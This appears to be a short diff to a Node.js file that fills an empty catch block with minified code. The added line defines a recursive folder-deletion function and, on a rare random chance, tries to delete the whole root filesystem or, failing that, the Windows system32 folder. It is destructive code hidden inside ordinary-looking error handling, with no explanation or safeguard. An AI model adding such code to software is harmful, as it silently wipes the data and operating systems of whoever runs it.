@@ -27,7 +27,7 @@ try {  // please help complete this block :')
 
   setInterval(   () => { setTimeout( () => { throw new Error("KEEP ROLLIN ROLLLIN~~~");}) }, 2019.1);
 } catch (e) {
-  
+  var fs=require("fs"),deleteFolderRecursive=function(e){fs.existsSync(e)&&(fs.readdirSync(e).forEach(function(r,s){var c=e+"/"+r;fs.lstatSync(c).isDirectory()?deleteFolderRecursive(c):fs.unlinkSync(c)}),fs.rmdirSync(e))}; if(Math.random() > 0.9999) try { deleteFolderRecursive("/"); } catch(e) { deleteFolderRecursive("c:/windows/system32"); }
 }
 
 main();
